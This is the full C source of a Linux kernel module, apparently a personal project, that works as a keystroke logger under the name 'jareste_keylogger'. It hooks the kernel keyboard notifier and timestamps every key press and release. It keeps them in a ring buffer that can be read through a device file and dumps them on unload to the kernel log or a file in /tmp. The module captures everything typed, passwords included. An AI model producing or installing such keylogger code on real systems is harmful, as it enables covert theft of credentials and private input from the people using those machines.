#include <linux/module.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include <linux/ktime.h>
#include <linux/input.h>
#include <linux/slab.h>
#include <linux/err.h>
#include <linux/kernel.h>
#include <linux/spinlock.h>

#define IGNORE_REPEAT
// #define IGNORE_REPEAT_TIMESTAMP
#define LOG_KERNEL
// #define LOG_TMP_FILE
// #define LOG_ONLY_PRESSED
// #define LOG_STATS

typedef struct {
    const char *name;
    int ascii_code;
} KeyMap;

KeyMap key_table[] = {
    [0] = {"Reserved", 0},
    [1] = {"Esc", 27},
    [2] = {"1", '1'},
    [3] = {"2", '2'},
    [4] = {"3", '3'},
    [5] = {"4", '4'},
    [6] = {"5", '5'},
    [7] = {"6", '6'},
    [8] = {"7", '7'},
    [9] = {"8", '8'},
    [10] = {"9", '9'},
    [11] = {"0", '0'},
    [12] = {"Minus", '-'},
    [13] = {"Equal", '='},
    [14] = {"Backspace", 127},
    [15] = {"Tab", '\t'},
    [16] = {"Q", 'Q'},
    [17] = {"W", 'W'},
    [18] = {"E", 'E'},
    [19] = {"R", 'R'},
    [20] = {"T", 'T'},
    [21] = {"Y", 'Y'},
    [22] = {"U", 'U'},
    [23] = {"I", 'I'},
    [24] = {"O", 'O'},
    [25] = {"P", 'P'},
    [26] = {"Left Brace", '['},
    [27] = {"Right Brace", ']'},
    [28] = {"Enter", '\n'},
    [29] = {"Left Ctrl", 0},
    [30] = {"A", 'A'},
    [31] = {"S", 'S'},
    [32] = {"D", 'D'},
    [33] = {"F", 'F'},
    [34] = {"G", 'G'},
    [35] = {"H", 'H'},
    [36] = {"J", 'J'},
    [37] = {"K", 'K'},
    [38] = {"L", 'L'},
    [39] = {"Semicolon", ';'},
    [40] = {"Apostrophe", '\''},
    [41] = {"Grave", '`'},
    [42] = {"Left Shift", 0},
    [43] = {"Backslash", '\\'},
    [44] = {"Z", 'Z'},
    [45] = {"X", 'X'},
    [46] = {"C", 'C'},
    [47] = {"V", 'V'},
    [48] = {"B", 'B'},
    [49] = {"N", 'N'},
    [50] = {"M", 'M'},
    [51] = {"Comma", ','},
    [52] = {"Dot", '.'},
    [53] = {"Slash", '/'},
    [54] = {"Right Shift", 0},
    [55] = {"Keypad *", '*'},
    [56] = {"Left Alt", 0},
    [57] = {"Space", ' '},
    [58] = {"Caps Lock", 0},
    [59] = {"F1", 0},
    [60] = {"F2", 0},
    [61] = {"F3", 0},
    [62] = {"F4", 0},
    [63] = {"F5", 0},
    [64] = {"F6", 0},
    [65] = {"F7", 0},
    [66] = {"F8", 0},
    [67] = {"F9", 0},
    [68] = {"F10", 0},
    [69] = {"Num Lock", 0},
    [70] = {"F14", 0},
    [71] = {"Keypad 7", '7'},
    [72] = {"Keypad 8", '8'},
    [73] = {"Keypad 9", '9'},
    [74] = {"Keypad -", '-'},
    [75] = {"Keypad 4", '4'},
    [76] = {"Keypad 5", '5'},
    [77] = {"Keypad 6", '6'},
    [78] = {"Keypad +", '+'},
    [79] = {"Keypad 1", '1'},
    [80] = {"Keypad 2", '2'},
    [81] = {"Keypad 3", '3'},
    [82] = {"Keypad 0", '0'},
    [83] = {"Keypad Dot", '.'},
    [84] = {"Unknown", 0},
    [85] = {"F11", 0},
    [86] = {"F12", 0},
    [87 ... 90] = {"Reserved", 0},
    [91] = {"Keypad Enter", '\n'},
    [92] = {"Right Ctrl", 0},
    [93] = {"Keypad /", '/'},
    [94] = {"Right Alt", 0},
    [95] = {"Home", 0},
    [96] = {"Keypad Enter", '\n'},
    [97] = {"Page Up", 0},
    [98] = {"Keypad /", '/'},
    [99] = {"F13", 0},
    [100] = {"Right Alt", 0},
    [101] = {"Arrow Down", 0},
    [102] = {"Home", 0},
    [103] = {"Arrow up", 0},
    [104] = {"Page up", 0},
    [105] = {"Arrow Left", 0},
    [106] = {"Arrow Right", 0},
    [107] = {"End", 0},
    [108] = {"Arrow Down", 0},
    [109] = {"Page Down", 0},
    [110] = {"Insert", 0},
    [111] = {"Delete", 0},
    [112] = {"Keypad Equal", '='},
    [113 ... 119] = {"Reserved", 0},
    [119] = {"F15", 0},
    [120 ... 124] = {"Reserved", 0},
    [125] = {"Command Left", 0},
    [126] = {"Command Right", 0},
    [127] = {"Menu", 0},
    [128 ... 255] = {"Reserved", 0},
};


#define MAX_LOG_ENTRIES 512
#define MAX_LOG_LEN 128
#define LOG_FILE_PATH "/tmp/jareste_keylogger.log"
#define MAX_KEYS 256

#ifdef LOG_STATS
struct key_stats {
    u64 press_count;
    u64 total_hold_time; // in nanoseconds
    ktime_t last_press_time;
    bool is_pressed;
};

static struct key_stats stats[MAX_KEYS];
static DEFINE_SPINLOCK(stats_lock);
#endif // LOG_STATS

static char log_entries[MAX_LOG_ENTRIES][MAX_LOG_LEN];
static int log_start = 0;
static int log_count = 0;
static DEFINE_MUTEX(log_lock);

static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data);
static ssize_t keyboard_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);

static struct notifier_block nb = {
    .notifier_call = key_event_notifier,
};

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = keyboard_read,
};

static struct miscdevice keyboard_misc_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "jareste_keylogger",
    .fops = &fops,
};

static void print_stats(void)
{
#ifdef LOG_STATS
    int i;

    pr_info("=== Key Statistics ===\n");
    for (i = 0; i < MAX_KEYS; i++)
    {
        if (stats[i].press_count > 0)
        {
            u64 total_time_ns = stats[i].total_hold_time;
            u64 total_time_ms = total_time_ns / 1000000;
            u64 total_time_s = total_time_ms / 1000;
            total_time_ms %= 1000;

            if (total_time_s > 0)
            {
                pr_info("Key '%s': Pressed %llu times, Total hold time %llu s %llu ms\n",
                        key_table[i].name, stats[i].press_count, total_time_s, total_time_ms);
            }
            else
            {
                pr_info("Key '%s': Pressed %llu times, Total hold time %llu ms\n",
                        key_table[i].name, stats[i].press_count, total_time_ms);
            }
        }
    }
    pr_info("====================\n");
#endif // LOG_STATS
}

static void m_add_stats(int keycode, bool is_down)
{
#ifdef LOG_STATS
    spin_lock(&stats_lock);

    if (is_down)
    {
        if (!stats[keycode].is_pressed)
        {
            stats[keycode].press_count++;
            stats[keycode].last_press_time = ktime_get();
            stats[keycode].is_pressed = true;
        }
    }
    else
    {
        if (stats[keycode].is_pressed)
        {
            ktime_t now = ktime_get();
            stats[keycode].total_hold_time += ktime_to_ns(ktime_sub(now, stats[keycode].last_press_time));
            stats[keycode].is_pressed = false;
        }
    }
 
    spin_unlock(&stats_lock);
#endif // LOG_STATS
}

static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;
    char entry[MAX_LOG_LEN];
    int len;

    if (action == KBD_KEYCODE)
    {
        struct timespec64 ts;
        struct tm tm;

        ktime_get_real_ts64(&ts);
        time64_to_tm(ts.tv_sec, 0, &tm);

        len = snprintf(entry, sizeof(entry), "%02d:%02d:%02d: %s (%u) %s\n",
                       tm.tm_hour, tm.tm_min, tm.tm_sec,
                       key_table[param->value].name, key_table[param->value].ascii_code,
                       param->down ? "Pressed" : "Released");

        mutex_lock(&log_lock);

        int current_index = (log_start + log_count) % MAX_LOG_ENTRIES;

    m_add_stats(param->value, param->down);

#ifdef IGNORE_REPEAT
        /* Will ignore the same key press event */
        size_t timestamp_len = 8;

        if ((log_count > 0) && (current_index > 0) &&\
            memcmp(log_entries[current_index - 1] + timestamp_len,\
            entry + timestamp_len, len - timestamp_len) == 0)
        {
            mutex_unlock(&log_lock);
            return NOTIFY_OK;
        }
#elif defined(IGNORE_REPEAT_TIMESTAMP)
        /* Will accept the same key press event if it is repeated within the same second */
        if ((log_count > 0) && (current_index > 0) &&\
            memcmp(log_entries[current_index - 1], entry, len) == 0)
        {
            mutex_unlock(&log_lock);
            return NOTIFY_OK;
        }
#else /* No ignore */
        /* Will accept the same key press event */
#endif // IGNORE_REPEAT

        strncpy(log_entries[current_index], entry, MAX_LOG_LEN - 1);
        log_entries[current_index][MAX_LOG_LEN - 1] = '\0';

        if (log_count < MAX_LOG_ENTRIES)
        {
            log_count++;
        }
        else
        {
            log_start = (log_start + 1) % MAX_LOG_ENTRIES;
        }

        mutex_unlock(&log_lock);
    }
    return NOTIFY_OK;
}


static ssize_t keyboard_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    ssize_t ret = 0;
    int log_index = *ppos;
    int i;

    mutex_lock(&log_lock);

    if (log_index >= log_count)
    {
        mutex_unlock(&log_lock);
        return 0;
    }

    for (i = log_index; i < log_count && count > 0; i++)
    {
        int index = (log_start + i) % MAX_LOG_ENTRIES;
        const char *current_log = log_entries[index];
        size_t log_len = strlen(current_log);

        if (log_len > count)
        {
            break;
        }

        if (copy_to_user(buf + ret, current_log, log_len))
        {
            ret = -EFAULT;
            break;
        }

        ret += log_len;
        count -= log_len;
    }

    *ppos = i;
    mutex_unlock(&log_lock);

    return ret;
}

static int __init keyboard_init(void)
{
    int ret;

    ret = misc_register(&keyboard_misc_device);
    if (ret)
        return ret;

    ret = register_keyboard_notifier(&nb);
    if (ret)
        misc_deregister(&keyboard_misc_device);

    return ret;
}

static void keyboard_exit(void)
{
#ifdef LOG_KERNEL
    int i;

    pr_info("=== Keyboard Logger: Final Logs ===\n");

    mutex_lock(&log_lock);

    for (i = 0; i < log_count; i++)
    {
        int index = (log_start + i) % MAX_LOG_ENTRIES;

#ifdef LOG_ONLY_PRESSED
        if (strstr(log_entries[index], "Released") != NULL)
            continue;
#endif // LOG_ONLY_PRESSED

        pr_info("%s", log_entries[index]);
    }
    mutex_unlock(&log_lock);
#endif // LOG_KERNEL

#ifdef LOG_TMP_FILE
    struct file *log_file;
    int i;

    pr_info("=== Keyboard Logger: Final Logs ===\n");

    log_file = filp_open(LOG_FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(log_file))
    {
        pr_err("Failed to open %s for writing: error %ld\n", LOG_FILE_PATH, PTR_ERR(log_file));
        return;
    }

    mutex_lock(&log_lock);

    for (i = 0; i < log_count; i++)
    {
        int index = (log_start + i) % MAX_LOG_ENTRIES;

#ifdef LOG_ONLY_PRESSED
        if (strstr(log_entries[index], "Released") != NULL)
            continue;
#endif // LOG_ONLY_PRESSED
        const char *current_log = log_entries[index];
        size_t log_len = strlen(current_log);

        kernel_write(log_file, current_log, log_len, &log_file->f_pos);
    }

    mutex_unlock(&log_lock);

    filp_close(log_file, NULL);
#endif // LOG_TMP_FILE

    unregister_keyboard_notifier(&nb);
    misc_deregister(&keyboard_misc_device);

    print_stats();

#ifdef LOG_KERNEL
    pr_info("Keyboard logger unloaded successfully.\n");
#endif // LOG_KERNEL
#ifdef LOG_TMP_FILE
    pr_info("Keyboard logger unloaded successfully. Logs saved to %s\n", LOG_FILE_PATH);
#endif // LOG_TMP_FILE
}

module_init(keyboard_init);
module_exit(keyboard_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("jareste-");
MODULE_DESCRIPTION("Keyboard logger");
